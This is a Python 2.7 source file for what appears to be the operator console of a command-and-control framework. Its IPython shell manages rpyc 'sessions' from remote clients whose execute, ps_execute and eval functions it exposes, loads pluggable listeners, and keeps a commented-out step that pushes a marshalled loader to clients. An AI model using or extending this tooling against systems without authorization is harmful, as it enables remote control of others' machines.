#! /usr/bin/env python2.7

#import rpyc
#import sys
import logging
import json
import traceback
import zlib
import imp
import marshal
import sys
import os
from terminaltables import AsciiTable
from uuid import uuid4
#import threading
from rpyc.core import Service

from IPython import embed
from IPython.core.magic import Magics, magics_class, line_magic
from traitlets.config.loader import Config
#from IPython.core.autocall import IPyAutocall
from IPython.terminal.prompts import Prompts, Token
from IPython.terminal.embed import InteractiveShellEmbed

logging.basicConfig(format="%(asctime)s [%(levelname)s] - %(filename)s: %(funcName)s - %(message)s", level=logging.DEBUG)


class STService(Service):
    def __init__(self, stsessions):
        self.stsessions = stsessions

    def on_connect(self):
        try:
            self._conn._config.update({
                "allow_safe_attrs": True,
                "allow_public_attrs": False,
                "allow_pickle": False,
                "allow_getattr": True,
                "allow_setattr": False,
                "allow_delattr": False,
                "import_custom_exceptions": False,
                "instantiate_custom_exceptions": False,
                "instantiate_oldstyle_exceptions": False,
            })

            #self._conn._config["safe_attrs"].add("__iter__")
            #self._conn._config["safe_attrs"].add("readline")

            self.modules = None

            try:
                self.namespace = self._conn.root.namespace
            except Exception:
                logging.error('Error setting namespace alias:')
                logging.error(traceback.format_exc())

            self.execute = self._conn.root.execute
            self.ps_execute = self._conn.root.ps_execute
            self.register_remote_cleanup = self._conn.root.register_cleanup
            self.unregister_remote_cleanup = self._conn.root.unregister_cleanup
            self.exit = self._conn.root.exit
            self.eval = self._conn.root.eval
            self.get_infos = self._conn.root.get_infos
            self.builtin = self.modules.__builtin__
            self.builtins = self.modules.__builtin__
            self.exposed_stdin = sys.stdin
            self.exposed_stdout = sys.stdout
            self.exposed_stderr = sys.stderr
            self.stsessions.add_client(self)

        except Exception as e:
            logging.error("Caught error when receiving connection: {}".format(e))
            logging.error(traceback.format_exc())

    def on_disconnect(self):
        logging.info("[*] Client disconnected")

    def exposed_set_modules(self, modules):
        self.modules = modules

    def exposed_json_dumps(self, js, compressed=False):
        data = json.dumps(js)
        if compressed:
            data = zlib.compress(data)

        return data


class STPrompt(Prompts):

    def __init__(self, shell, **kwargs):
        Prompts.__init__(self, shell=shell, **kwargs)
        self.context = []

    def in_prompt_tokens(self, cli=None):
        if not self.context:
            return [
                (Token, "ST"),
                (Token.Prompt, " > ")
            ]
        else:
            prompt = [(Token, "ST")]

            for status in self.context:
                prompt.extend([
                    (Token, "("),
                    (Token.PromptNum, status),
                    (Token, ")"),
                ])

            prompt.append((Token.Prompt, " > "))

            return prompt

    def continuation_prompt_tokens(self, cli=None, width=None):
        if width is None:
            width = self._width()
        return [(Token.Prompt, (' ' * (width - 2)) + u' > '), ]

    def out_prompt_tokens(self):
        spaces = 0
        if self.context:
            spaces = len(self.context) + 2

        return [(Token, " " * spaces + "  "), (Token.Prompt, " > ")]

    def set_context(self, context):
        self.context = [context]

    def clear_context(self):
        self.context = []

    def add_context(self, context):
        self.context.extend(context)


@magics_class
class STSessions(Magics):
    def __init__(self, shell, **kwargs):
        Magics.__init__(self, shell=shell, **kwargs)
        self.sessions = {}

    def add_client(self, conn):
        """
        with open('utils/client_initializer.py') as initializer:
            conn.execute(
                'import marshal;exec marshal.loads({})'.format(
                    repr(marshal.dumps(compile(initializer.read(), '<loader>', 'exec')))
                )
            )
        """

        address = conn._conn._config['connid']
        try:
            if type(address) is list:
                address = address[0]
            address = conn._conn._config['connid'].rsplit(':', 1)[0]
        except:
            address = str(address)

        client_ip, client_port = conn._conn._config['connid'].rsplit(':', 1)
        uid = str(uuid4())[:8]
        logging.info("Session {} opened (user@machine) ({} <- {}:{})".format(uid, address, client_ip, client_port))

        self.sessions[uid] = conn

    def add_context(self, context):
        self.shell.sessions_shell.prompts.add_context(context)

    @line_magic
    def show(self, line):
        table_data = [
            ['uid']
        ]

        for k, v in self.sessions.iteritems():
            table_data.append([k])

        table = AsciiTable(table_data)
        table.inner_row_border = True
        print table.table

    @line_magic
    def help(self, line):
        for k in self.magics['line'].keys():
            print k

    @line_magic
    def listeners(self, line):
        self.back(line)
        self.shell.listeners(line)

    @line_magic
    def back(self, line):
        self.shell.sessions_shell.exiter()


@magics_class
class STListeners(Magics):
    def __init__(self, shell, **kwargs):
        Magics.__init__(self, shell=shell, **kwargs)

        self.available = []
        self.selected = None

        if not self.available:
            self.scan()

    def check(self, listener, path):
        attrs = ['name', 'author', 'description', 'listener_thread', 'options']

        for attr in attrs:
            if not hasattr(listener, attr):
                logging.error('Failed loading listener {}: missing {} attribute'.format(path, attr))
                return False

        return True

    def load(self, listener_path):
        listener = imp.load_source('protocol', listener_path).Listener()
        if self.check(listener, listener_path):
            return listener

    def scan(self):
        path = './listeners/'
        self.available = []
        for listener in os.listdir(path):
            if listener[-3:] == '.py' and listener[:-3] != '__init__':
                obj = self.load(os.path.join(path, listener))
                self.available.append(obj)
                logging.debug("Loaded {} listener".format(obj.name))

    def add_context(self, context):
        self.shell.listeners_shell.prompts.add_context(context)

    @line_magic
    def reload(self):
        self.scan()

    @line_magic
    def use(self, line):
        for listener in self.available:
            if line.lower() == listener.name.lower():
                self.add_context(line)
                self.selected = listener
                self.shell.listeners_shell.prompts.clear_context()
                self.shell.listeners_shell.prompts.add_context(['listeners', self.selected.name])
                return

    @line_magic
    def set(self, line):
        if self.selected:
            name, value = line.split()

            for k, v in self.selected.options.iteritems():
                if name == k:
                    v['Value'] = value

    @line_magic
    def options(self, line):
        if self.selected:
            table_data = [
                ['Name', 'Description', 'Required', 'Value']
            ]

            for k, v in self.selected.options.iteritems():
                table_data.append([k, v['Description'], v['Required'], v['Value']])

            table = AsciiTable(table_data)
            #table.inner_row_border = True
            print table.table

    @line_magic
    def back(self, line):
        self.shell.listeners_shell.exiter()

    @line_magic
    def show(self, line):
        return [listener.name for listener in self.available]

    @line_magic
    def help(self, line):
        for k in self.magics['line'].keys():
            print k

    @line_magic
    def sessions(self, line):
        self.back(line)
        self.shell.sessions(line)


@magics_class
class STShell(Magics):
    def __init__(self, shell, **kwargs):
        Magics.__init__(self, shell=shell, **kwargs)
        self.listeners = STListeners(self)
        self.sessions = STSessions(self)
        self.service = STService(self.sessions)

        self.listeners_shell = st_shell(self.listeners)
        self.sessions_shell = st_shell(self.sessions)

    @line_magic
    def listeners(self, line):
        self.listeners_shell.prompts.set_context('listeners')
        self.listeners_shell()
        self.listeners_shell.prompts.clear_context()

    @line_magic
    def sessions(self, line):
        self.sessions_shell.prompts.set_context('sessions')
        self.sessions_shell()
        self.sessions_shell.prompts.clear_context()

    @line_magic
    def help(self, line):
        for k in self.magics['line'].keys():
            print k


def st_shell(magic_class):
    cfg = Config()
    ipshell = InteractiveShellEmbed(banner1="", exit_msg="", config=cfg)
    ipshell.register_magics(magic_class)
    ipshell.prompts = STPrompt(ipshell)
    return ipshell


if __name__ == "__main__":
    st_shell(STShell)()
